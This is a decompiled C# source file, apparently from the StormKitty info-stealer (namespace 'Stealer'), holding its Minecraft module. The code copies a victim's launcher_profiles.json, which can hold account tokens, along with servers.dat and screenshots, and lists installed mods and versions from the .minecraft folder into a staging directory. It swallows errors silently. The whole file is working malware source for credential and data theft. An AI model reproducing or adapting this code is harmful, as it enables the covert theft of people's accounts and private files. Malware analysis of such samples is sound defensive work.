using System;
using System.IO;
using StormKitty;

namespace Stealer
{
	// Token: 0x02000012 RID: 18
	internal sealed class Minecraft
	{
		// Token: 0x06000066 RID: 102 RVA: 0x000044C0 File Offset: 0x000026C0
		private static void SaveVersions(string sSavePath)
		{
			foreach (string path in Directory.GetDirectories(Path.Combine(Minecraft.MinecraftPath, "versions")))
			{
				string name = new DirectoryInfo(path).Name;
				string text = Filemanager.DirectorySize(path).ToString() + " bytes";
				string text2 = Directory.GetCreationTime(path).ToString("yyyy-MM-dd h:mm:ss tt");
				File.AppendAllText(sSavePath + "\\versions.txt", string.Concat(new string[]
				{
					"VERSION: ",
					name,
					"\n\tSIZE: ",
					text,
					"\n\tDATE: ",
					text2,
					"\n\n"
				}));
			}
		}

		// Token: 0x06000067 RID: 103 RVA: 0x0000457C File Offset: 0x0000277C
		private static void SaveMods(string sSavePath)
		{
			foreach (string text in Directory.GetFiles(Path.Combine(Minecraft.MinecraftPath, "mods")))
			{
				string fileName = Path.GetFileName(text);
				string text2 = new FileInfo(text).Length.ToString() + " bytes";
				string text3 = File.GetCreationTime(text).ToString("yyyy-MM-dd h:mm:ss tt");
				File.AppendAllText(sSavePath + "\\mods.txt", string.Concat(new string[]
				{
					"MOD: ",
					fileName,
					"\n\tSIZE: ",
					text2,
					"\n\tDATE: ",
					text3,
					"\n\n"
				}));
			}
		}

		// Token: 0x06000068 RID: 104 RVA: 0x00004638 File Offset: 0x00002838
		private static void SaveScreenshots(string sSavePath)
		{
			string[] files = Directory.GetFiles(Path.Combine(Minecraft.MinecraftPath, "screenshots"));
			if (files.Length == 0)
			{
				return;
			}
			Directory.CreateDirectory(sSavePath + "\\screenshots");
			foreach (string text in files)
			{
				File.Copy(text, sSavePath + "\\screenshots\\" + Path.GetFileName(text));
			}
		}

		// Token: 0x06000069 RID: 105 RVA: 0x0000469C File Offset: 0x0000289C
		private static void SaveServers(string sSavePath)
		{
			string text = Path.Combine(Minecraft.MinecraftPath, "servers.dat");
			if (!File.Exists(text))
			{
				return;
			}
			File.Copy(text, sSavePath + "\\servers.dat");
		}

		// Token: 0x0600006A RID: 106 RVA: 0x000046D4 File Offset: 0x000028D4
		private static void SaveProfiles(string sSavePath)
		{
			string text = Path.Combine(Minecraft.MinecraftPath, "launcher_profiles.json");
			if (!File.Exists(text))
			{
				return;
			}
			File.Copy(text, sSavePath + "\\launcher_profiles.json");
		}

		// Token: 0x0600006B RID: 107 RVA: 0x0000470C File Offset: 0x0000290C
		public static void SaveAll(string sSavePath)
		{
			if (!Directory.Exists(Minecraft.MinecraftPath))
			{
				return;
			}
			try
			{
				Directory.CreateDirectory(sSavePath);
				Minecraft.SaveProfiles(sSavePath);
				Minecraft.SaveServers(sSavePath);
				Minecraft.SaveScreenshots(sSavePath);
				Minecraft.SaveMods(sSavePath);
				Minecraft.SaveVersions(sSavePath);
			}
			catch
			{
			}
		}

		// Token: 0x0400004F RID: 79
		private static string MinecraftPath = Path.Combine(Paths.appdata, ".minecraft");
	}
}
